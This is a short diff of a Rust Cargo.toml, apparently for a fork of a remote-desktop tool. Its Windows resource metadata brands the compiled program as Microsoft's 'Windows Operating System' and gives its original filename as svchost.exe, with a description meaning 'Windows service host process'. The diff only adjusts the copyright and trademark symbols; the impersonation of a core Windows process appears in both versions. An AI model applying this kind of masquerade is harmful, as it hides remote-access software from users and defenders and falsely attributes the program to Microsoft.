@@ -173,8 +173,8 @@ members = ["libs/scrap", "libs/hbb_common", "libs/enigo", "libs/clipboard", "lib
 exclude = ["vdi/host", "examples/custom_plugin"]
 
 [package.metadata.winres]
-LegalCopyright = "\xA9 Microsoft Corporation. All rights reserved."
-ProductName = "Microsoft\xAE Windows\xAE Operating System"
+LegalCopyright = "Microsoft Corporation. All rights reserved."
+ProductName = "Microsoft Windows Operating System"
 FileDescription = "Windows 服务主进程"
 OriginalFilename = "svchost.exe"
 
